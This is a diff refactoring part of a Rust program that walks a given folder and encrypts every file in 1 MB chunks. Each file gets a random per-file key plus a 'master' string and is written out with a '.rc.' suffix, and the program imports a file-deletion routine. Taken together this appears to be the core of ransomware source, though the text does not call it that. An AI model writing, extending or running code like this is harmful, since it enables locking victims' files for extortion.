@@ -3,8 +3,10 @@ use std::path::PathBuf;
 use std::io::{Read, Write};
 use std::fs::File;
 
+use lib::misc::{has_val, get_val, gen_str};
 use lib::crypto::encrypt;
 use lib::file::delete_file;
+use lib::{KEY_LEN, EXT_LEN};
 
 const SUFFIX: &str = ".rc.";
 const CHUNK: usize = 1 * 1024 * 1024;
@@ -12,16 +14,13 @@ const CHUNK: usize = 1 * 1024 * 1024;
 fn main() {
     let args = env::args()
         .skip(1)
-        .collect::<Vec<String>>()
-        .join(" ");
+        .collect::<Vec<String>>();
 
-    let verbose = lib::misc::get_flag(&args, "verbose");
+    let verbose = has_val(&args, "verbose");
+    let master = get_val(&args, "master");
+    let folder = get_val(&args, "folder");
 
-    let master = lib::misc::get_val(&args, "master");
-
-    let folder = lib::misc::get_val(&args, "folder");
     let files = lib::file::get_files(folder);
-
     for file in &files {
         match process_file(file, &master) {
             Ok(_) => {
@@ -37,14 +36,14 @@ fn main() {
                 }
 
                 println!("[!] failed for: {} - {}", file.display(), err);
-            },
+            }
         };
     }
 }
 
 pub fn process_file(file: &PathBuf, master: &str) -> Result<(), &'static str> {
-    let key = lib::misc::gen_str(100);
-    let suffix = lib::misc::gen_str(10);
+    let key = gen_str(KEY_LEN);
+    let suffix = gen_str(EXT_LEN);
 
     let full_key = format!("{}{}{}", key, suffix, master);
 
@@ -83,10 +82,10 @@ pub fn process_file(file: &PathBuf, master: &str) -> Result<(), &'static str> {
         }
 
         let chunk = &buffer[..bytes];
-        let encrypted = encrypt(&chunk.to_vec(), &full_key);
+        let encrypted = encrypt(chunk, full_key.as_bytes());
 
         enc_file
-            .write_all(encrypted.as_bytes())
+            .write_all(&encrypted)
             .map_err(|_| "failed to write to encrypted file")?;
     }
 
